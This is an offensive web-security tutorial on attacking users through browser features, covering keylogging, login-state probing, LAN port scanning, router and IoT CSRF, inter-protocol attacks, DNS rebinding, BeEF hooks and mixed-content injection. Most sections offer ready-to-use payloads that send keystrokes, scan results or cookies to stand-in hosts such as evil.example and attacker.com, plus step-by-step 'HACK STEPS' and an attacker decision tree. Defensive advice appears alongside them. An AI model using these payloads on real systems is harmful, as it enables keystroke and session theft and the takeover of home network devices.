# Attacking the Browser

Not all user attacks require bugs in a target web app. Some ride on **browser behavior and core web platform features**. Any malicious site (or a benign site that got popped) can launch these. Understanding them helps you judge how dangerous an app’s *perfectly normal* behavior can be when combined with the browser’s quirks.

Below you’ll find **what works in 2025**, where old tricks were nerfed, and **drop-in PoCs**.

---

## 1) Keystroke Logging (incl. “Reverse Strokejacking”)

**Idea:** Run JS that captures keyboard events while your frame has focus. If a victim app embeds third-party content (ads/widgets) without sandboxing, that third-party can steal focus and log keys.

### PoC: Plain keylogger (same-origin or unsandboxed 3rd-party frame)

```html
<script>
  // Minimal keylogger (works while the doc/iframe has focus)
  window.addEventListener('keydown', e => {
    // exfil in batches to cut noise
    buffer.push(e.key);
    if (buffer.length >= 20 || e.key === 'Enter') {
      navigator.sendBeacon('https://attacker.example/log', buffer.join(''));
      buffer.length = 0;
    }
  }, true);
  const buffer = [];
</script>
```

### PoC: “Reverse strokejacking” (child frame steals focus)

Works when the child frame is **not sandboxed** (no `sandbox` attr; or `allow-scripts allow-same-origin` granted) and can call `focus()` often enough to keep capturing.

```html
<!-- Attacker-controlled iframe injected by ads/widget -->
<iframe id="ad" src="https://evil.example/focus.html" style="position:fixed; inset:0; opacity:0; pointer-events:none"></iframe>
```

```html
<!-- https://evil.example/focus.html -->
<!doctype html><script>
  // Keep stealing focus while user types; log keys
  let lastKey = Date.now();
  window.addEventListener('keydown', e => {
    lastKey = Date.now();
    navigator.sendBeacon('https://evil.example/keys', e.key);
  }, true);

  // “Blinking caret illusion”: quickly relinquish focus when idle
  setInterval(() => {
    if (Date.now() - lastKey < 250) self.focus();
  }, 75);
</script>
```

### HACK STEPS

1. **Hunt for unsandboxed iframes** on the target app (ads, analytics, widgets).
2. If you control that third-party content, use the focus-steal pattern.
3. Exfiltrate via `sendBeacon()` to avoid blocking UI.

### Modern Limits

* Browsers won’t let a cross-origin child *read* the parent DOM, but they **can still steal focus** if not sandboxed.
* Many ad iframes now ship with `sandbox` by default → your mileage may vary.

### Defenses

* **Sandbox all third-party iframes**: `sandbox="allow-scripts"` (omit `allow-top-navigation`, `allow-modals`, `allow-forms` unless required).
* Use **CSP frame-ancestors** to prevent untrusted embedding of your pages.
* Sensitive inputs: **require focus within your top document** (e.g., show an overlay if `document.activeElement` isn’t expected).

---

## 2) Stealing Browser History & Search Queries

**Classic “\:visited” CSS sniffing is dead.** Modern browsers neuter `getComputedStyle` differences for `:visited`, so you can’t brute-force the user’s history that way anymore.

**What still exists (edge cases):**

* **Timing/caching side-channels** against third-party endpoints can sometimes infer state, but **Resource Timing** is gated behind **Timing-Allow-Origin**.
* **HSTS “supercookies”** and other cache/protocol quirks have been progressively mitigated and are brittle for real-world use.

**TL;DR (2025):** Treat broad “history sniffing” as **mostly mitigated**; focus on **login state detection** for specific sites instead (below).

---

## 3) Enumerating Logged-In Applications (Login State Detection)

**Goal:** Know whether the user is logged into target-site X right now. That lets you fire **high-confidence CSRF** or tailor social engineering.

**Classic trick** (cross-domain `<script>` and read `window.onerror` line numbers) now usually yields **“Script error.”** because of CORS/CORP. But you can still use **resource load signals** and **MIME mismatches**.

### PoC: Image login probe (works when the site behaves differently if authenticated)

* Target endpoint returns **200 image** only if logged in; otherwise **302 to login** (or HTML). On image tag:

  * `onload` → likely logged in
  * `onerror` → likely not logged in

```html
<img
  src="https://target.example/account/avatar?size=32"
  onload="report('in');"
  onerror="report('out');"
  style="display:none">
<script>
  function report(state){
    navigator.sendBeacon('https://evil.example/state', 'target='+state);
  }
</script>
```

### PoC: Redirect chain MIME mismatch

If unauth’d response is an **HTML login page**, many browsers fire `onerror` for `<img>`:

```html
<img src="https://bank.example/profile/photo"
     onerror="report('not-logged')"
     onload="report('logged')">
```

### PoC: Pixel endpoints

Some apps expose **1×1 pixel** endpoints only when logged in (`/csrf-pixel`, `/session/ping`). Those are perfect for `onload` checks.

### HACK STEPS

1. **Fingerprint a set of endpoints** that differ logged-in vs not (avatars, notifications feed, export CSV, pixel beacons).
2. Test in a **clean profile**: does `<img>` fire `onload` only when authenticated?
3. Ship the appropriate probes, collect results via `sendBeacon`.

### Modern Limits

* **SameSite** defaults (Lax) often block sending cookies on cross-site *subresource* requests; some targets set `SameSite=None; Secure` (then probes work).
* **CORP/CORB** block script/style leaks but **don’t stop image load success/fail** signaling.

### Defenses

* **SameSite=Strict/Lax** for session cookies when possible.
* Ensure **unauthenticated responses** to sensitive endpoints are **uniform (same status/MIME/size)** and don’t reveal auth state via load/error.
* Consider **token-gated images** and require **CORS with credentials** (and fail “opaque” otherwise).

---

## 4) Browser-Based Port Scanning (LAN & localhost)

Even in 2025, the browser can still **signal reachability** to internal IPs via element load/error and timeouts. You won’t read responses, but you can discover **open ports** and **device types**.

### PoC: IMG scanner for 192.168.1.0/24 on common ports

```html
<script>
const hosts = Array.from({length:254}, (_,i)=>`192.168.1.${i+1}`);
const ports = [80, 443, 8000, 8080, 8443, 5000];
const results = [];

function probe(host, port) {
  return new Promise(resolve => {
    const img = new Image();
    const t = setTimeout(() => { cleanup(); resolve({host,port,open:false,why:'timeout'}); }, 1200);
    function cleanup(){ img.onload = img.onerror = null; clearTimeout(t); }
    img.onload  = () => { cleanup(); resolve({host,port,open:true, why:'load'}); };
    img.onerror = () => { cleanup(); resolve({host,port,open:true, why:'error'}); };
    img.src = `http://${host}:${port}/favicon.ico#${Math.random()}`;
  });
}

(async ()=>{
  for (const h of hosts) {
    for (const p of ports) {
      const r = await probe(h,p);
      results.push(r);
      if (r.open) navigator.sendBeacon('https://evil.example/scan', JSON.stringify(r));
    }
  }
})();
</script>
```

**Why `onerror` can still mean “open”:** If anything answers (even non-image content), the network path is alive → browser fires `onerror` quickly instead of timing out.

### Fingerprinting devices

Probe for **well-known resources**:

```html
<img src="http://192.168.1.1/hm_icon.gif"
     onload="report('netgear')"
     onerror="/* try other fingerprints */">
```

### HACK STEPS

1. Probe internal ranges (`10.0.0.0/8`, `172.16.0.0/12`, `192.168.0.0/16`) and `127.0.0.1`.
2. Record **fast error vs timeout** to separate closed ports from open services.
3. Fingerprint with **device-specific resource URLs**.

### Modern Limits

* Browsers block requests to some **privileged ports**, but common web ports are fair game.
* **Service Workers** do not help here; subresource loads bypass their scope for cross-origin IPs.

### Defenses

* Place admin UIs on **non-routable subnets/VPN**.
* Require **mutual TLS** or **local auth tokens** not sent by the browser by default.
* **CORS preflight + Origin checks** on local APIs; block unauthenticated subresource requests.

---

## 5) Attacking Other Network Hosts (Routers / IoT / Local APIs)

Once you know a host/port is up, you can attempt **CSRF/unauth** actions even without reading responses.

### PoC: Blind CSRF to change router DNS

```html
<form id="pwn" action="http://192.168.1.1/apply.cgi" method="POST" target="hidden">
  <input name="dns1" value="1.2.3.4">
  <input name="dns2" value="1.2.3.5">
  <input name="apply" value="Save">
</form>
<iframe name="hidden" style="display:none"></iframe>
<script> document.getElementById('pwn').submit(); </script>
```

### PoC: JSON API without CSRF tokens (IoT cam)

```html
<script>
fetch('http://192.168.0.50/api/config', {
  method: 'POST',
  mode: 'no-cors',        // fire-and-forget
  headers: {'Content-Type':'application/json'},
  body: JSON.stringify({ cloudUpload: true, url: 'https://evil.example/upload' })
});
</script>
```

### HACK STEPS

1. Identify **write endpoints** from vendor docs, Shodan templates, or fingerprints.
2. Try **GET with query params** and **POST form/json**.
3. Use **iframes/forms** for endpoints that reject `fetch` due to CORS.
4. Chain multiple requests (timed) to set creds, enable remote mgmt, or reboot.

### Modern Limits

* Many devices finally ship CSRF tokens & `SameSite` cookies — but **lots still don’t**, especially cheap IoT.
* Some UIs are behind **Basic/Digest** auth; you can’t supply creds cross-site, but defaults may be enabled/lax.

### Defenses

* **CSRF tokens** on every state-changing route. Validate **Origin/Referer**.
* **SameSite=Strict** on admin cookies.
* Bind admin UI to **localhost** + require **client certs** or **pairing tokens**.
* Deny requests with **cross-site `Sec-Fetch-Site: cross-site`** and unexpected **`Sec-Fetch-Mode`**.

---

## 6) Inter-Protocol Exploitation (Non-HTTP Services)

**Idea:** Send HTTP-looking traffic to a **non-HTTP service** on the LAN/localhost that **tolerates junk** before real commands. Some text-based protocols ignore unknown leading lines, then process the next well-formed command. Your browser can’t read responses (SOP), but:

* You can **perform actions** (write/flush/reset),
* Or sometimes **induce XSS** in a co-hosted web app that echoes error text.

### PoC sketch: POST with `text/plain` carrying protocol commands

(works only if service accepts HTTP headers before its own protocol)

```html
<form action="http://127.0.0.1:12345"
      method="POST" enctype="text/plain" target="hidden">
  <!-- Leading HTTP headers get ignored by tolerant services -->
  AUTH secret-token
  SET notify_url https://evil.example/hit
  FLUSH
</form>
<iframe name="hidden" style="display:none"></iframe>
<script> document.forms[0].submit(); </script>
```

**Reality check (2025):**

* Many **service ports are browser-blocked**; this still pops up on **custom admin daemons** and odd ports that accept text.
* **WebSockets** won’t help unless the service completes the WS handshake.

### HACK STEPS

1. From your port scan, pick **text-based services** on unusual ports.
2. Try **`<form enctype="text/plain">`** or **`fetch` with `no-cors`** and suitable body.
3. Look for **side effects** (device behavior changes, follow-up HTTP hits to your server).
4. If co-hosted with web, attempt to **echo HTML** in an error path to trigger XSS in the browser (rare but possible).

### Defenses

* Don’t co-host non-HTTP admin services on the same hostnames as web apps.
* Make non-HTTP services **drop unknown preambles**; enforce **strict framing**.
* Use **auth** and **bind to localhost/VPN only**.
* On the web app, **never reflect raw service responses** into HTML.

---

## 7) DNS Rebinding (Bypassing SOP to Reach LAN)

**Idea:** Your page runs from `attacker.example`. DNS returns your server first; the browser records the origin as `attacker.example`. You flip the DNS A record to `192.168.1.1`. Subsequent same-origin requests (still `https://attacker.example`) now **hit the LAN host** but the browser still believes it’s the same origin.

**Why it still matters:** When the internal service **doesn’t validate `Host` / `Origin`** and speaks HTTP, you can **read** responses (not just blind-fire) because, from the browser’s POV, it’s the same origin.

### PoC outline

* Serve page from `attacker.example`.
* Set ultra-low TTL on `A attacker.example`.
* After page load, **poll** until rebinding occurs (e.g., request a nonce path your server doesn’t have; when it starts returning different content/timeout profile, you probably hit the LAN box).
* Then perform **XHR/fetch** to `https://attacker.example/api/...` and **read** results.

### HACK STEPS

1. Stand up a DNS that supports **per-query short TTL** and alternating answers.
2. Target LAN service that **ignores `Host` header** or treats any host as valid.
3. Script a **rebind detector** and then pivot into **read/write HTTP**.

### Modern Limits

* Many runtimes validate `Host` or use **absolute URLs**; CDNs and cloud stacks often don’t bind to LAN IPs.
* Some resolvers **pin DNS** per connection for short periods; but there are still exploitable stacks.

### Defenses

* Always validate **`Host`/`Origin`**; reject unknown hosts.
* Bind admin APIs to **fixed private hostnames**; require **same-site tokens**.
* Use **Rebind protection** in DNS resolvers/routers (some home routers have it).

---

## Universal Blue-Team Controls (High ROI in 2025)

* **CSP**: `script-src 'self' https://trusted-cdn; object-src 'none'; frame-ancestors 'self'`.
* **Iframe sandbox** all third-party content; minimum grants.
* **SameSite cookies** (`Lax` or `Strict`), `Secure`, `HttpOnly`.
* **CSRF**: per-request tokens + **Origin/Referer** checks.
* **CORP/CORB/COEP** to prevent cross-type leaks; CORS locked to allowlisted origins.
* Validate **`Sec-Fetch-*`** headers (deny cross-site state changes).
* **X-Frame-Options / frame-ancestors** to prevent clickjacking and embedding.
* **Referrer-Policy: strict-origin-when-cross-origin** (or stricter).
* Avoid exposing **auth state** via resource load success/failure.
* Keep admin interfaces **off the LAN default**; require **pairing or client certs**.

---

## Quick Decision Tree (Attacker’s POV)

1. **Third-party iframes?** → Try focus-steal keylogging.
2. **Want to know where they’re logged in?** → Probe images/pixels with `onload/onerror`.
3. **Want a LAN foothold?** → Run image-based **port scan**, fingerprint devices.
4. **Blind actions on LAN device?** → POST via form/iframe; time sequenced changes.
5. **Need to read LAN data?** → Attempt **DNS rebinding** against HTTP services ignoring `Host`.
6. **Weird ports answering?** → Try **inter-protocol** POSTs (`text/plain`) and observe side effects.

---

## **Exploiting Browser Bugs**

### 1. **DNS Rebinding**

#### What’s Happening

* **Goal**: Trick the victim’s browser into bypassing same-origin restrictions by changing the IP address that a domain resolves to **after** the initial connection.
* **Why it Works**: Browsers trust that the *domain* remains constant in the same-origin policy check — but they don’t always revalidate if the IP changes between requests.
* **Primary Use Case**: Target internal apps or services that aren’t accessible from the public internet.

#### Attack Flow

1. Victim visits malicious domain `attacker.com` → resolves to `1.1.1.1` (attacker’s server).
2. Browser makes allowed same-origin requests to `attacker.com`.
3. Attacker changes DNS to make `attacker.com` resolve to an internal IP, e.g., `192.168.0.5`.
4. Browser sends requests (still thinking it’s same-origin) but actually hits the internal service.

#### Example Payload (JavaScript)

```javascript
// Initial request to attacker-controlled server
function probeInternal() {
    fetch("http://attacker.com:8080/internal-check")
    .then(res => res.text())
    .then(data => console.log("Internal response: ", data))
    .catch(err => console.error("No access:", err));
}
setInterval(probeInternal, 2000); // Keep probing after DNS TTL expires
```

#### Modern Defenses

* **Browser**: Chrome/Firefox block rebinding to private IP ranges by default.
* **Server**: Use `Host` header validation and token-based access control.
* **Network**: Split-horizon DNS with short TTLs is suspicious.

#### 2025 Reality Check

* Classic rebinding is harder due to built-in blocklists, but still works against:

  * IoT devices
  * Old embedded web servers
  * Misconfigured internal APIs

---

### 2. **Browser Exploitation Frameworks (BeEF, XSS Shell, etc.)**

#### What’s Happening

* You inject a small JavaScript “hook” into a victim’s browser (via XSS, malicious ad, or compromised site).
* The browser then becomes a *remote-controlled zombie* — you can send commands, collect data, and launch further attacks.

#### Attack Flow

1. Find an XSS on target site or get victim to visit malicious page.
2. Inject BeEF hook:

```html
<script src="http://attacker.com/hook.js"></script>
```

3. Browser connects to BeEF C2 server and registers as “online.”
4. Attacker issues commands: steal cookies, perform port scans, keylogging.

#### Example Actions in BeEF

* **Keylogging**

```javascript
beef.net.send('<command_id>', 'result=Key pressed: ' + key);
```

* **Internal Network Scan**

```javascript
for (let i = 1; i <= 255; i++) {
  let img = new Image();
  img.src = "http://192.168.0." + i + ":80/";
}
```

* **Session Hijacking**

```javascript
document.location="http://attacker.com/steal?cookie=" + document.cookie;
```

#### 2025 Reality Check

* BeEF is still actively maintained and useful in red-team scenarios.
* Many extensions and plugins increase attack surface (crypto wallet plugins, password managers).

---

### 3. **Man-in-the-Middle (MITM) Attacks Against HTTPS**

#### What’s Happening

* Even with HTTPS, an active MITM can:

  * Inject malicious scripts into HTTP-loaded assets.
  * Exploit mixed-content issues.
  * Abuse automatic background HTTP requests (e.g., update checks, analytics pings).

#### Attack Flow

1. Victim connects to public Wi-Fi (MITM position).
2. MITM watches for any **HTTP request** made by the browser (could be background).
3. MITM responds with a redirect to target domain over HTTP.
4. Victim’s browser follows redirect → attacker injects malicious JS into a script load.

#### Example Exploit

Victim’s site loads:

```html
<script src="http://example.com/help.js"></script>
```

MITM injects:

```javascript
alert('Compromised via mixed content!');
fetch('https://bank.com/transfer?to=attacker&amount=1000');
```

#### Modern Twist (2025)

* Still works if:

  * Site has HTTP dependencies
  * Internal company tools don’t enforce HTTPS
  * IoT/admin panels accept HTTP by default
* Real threat in shared network environments (cafés, hotels, conferences).

---

### Key Takeaways

* **DNS Rebinding**: Still a threat to poorly secured internal services and IoT.
* **Browser Exploitation Frameworks**: In 2025, BeEF and similar tools are *very relevant* in red-team engagements.
* **MITM over HTTPS**: Less about breaking TLS, more about abusing insecure asset loads and mixed content.

---